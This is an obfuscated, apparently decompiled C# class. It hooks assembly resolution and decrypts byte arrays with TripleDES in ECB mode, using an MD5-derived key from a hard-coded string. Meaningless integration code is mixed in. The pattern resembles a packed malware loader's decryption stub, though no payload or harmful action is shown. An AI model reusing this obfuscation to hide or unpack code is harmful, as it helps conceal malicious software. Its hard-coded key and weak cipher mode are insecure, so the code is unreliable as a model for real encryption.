using System;
using System.Security.Cryptography;
using System.Text;
using Stihcpdaboumyasclt.Classes;
using Stihcpdaboumyasclt.Shared;

namespace Stihcpdaboumyasclt.Roles;

public sealed class Token
{
	public Token()
	{
		UtilsComparatorClass @object = new UtilsComparatorClass();
		AppDomain.CurrentDomain.AssemblyResolve += @object.CalculateInitializer;
	}

	public byte[] AwakeInitializer(byte[] i)
	{
		return CalcInitializer(i);
	}

	private byte[] CalcInitializer(byte[] v)
	{
		byte[] bytes = Encoding.UTF8.GetBytes("Befpopocufp");
		try
		{
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			try
			{
				byte[] array2 = (tripleDESCryptoServiceProvider.Key = new MD5CryptoServiceProvider().ComputeHash(bytes));
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				return tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(v, 0, v.Length);
			}
			finally
			{
				((IDisposable)tripleDESCryptoServiceProvider).Dispose();
			}
		}
		catch (Exception ex)
		{
			throw new Exception(ex.Message);
		}
	}

	public double ComputeInitializer(Account init, double col, double state, AuthorCompletionSetKind map2)
	{
		int num = 0;
		switch (map2)
		{
		case (AuthorCompletionSetKind)1:
			num = 100;
			break;
		case (AuthorCompletionSetKind)2:
			num = 10000;
			break;
		case (AuthorCompletionSetKind)3:
			num = 1000000;
			break;
		}
		double num2 = (state - col) / (double)num;
		double num3 = (init(col) + init(state)) / 2.0;
		for (int i = 1; i < num; i++)
		{
			num3 += init(col + (double)i * num2);
		}
		return num2 * num3;
	}
}
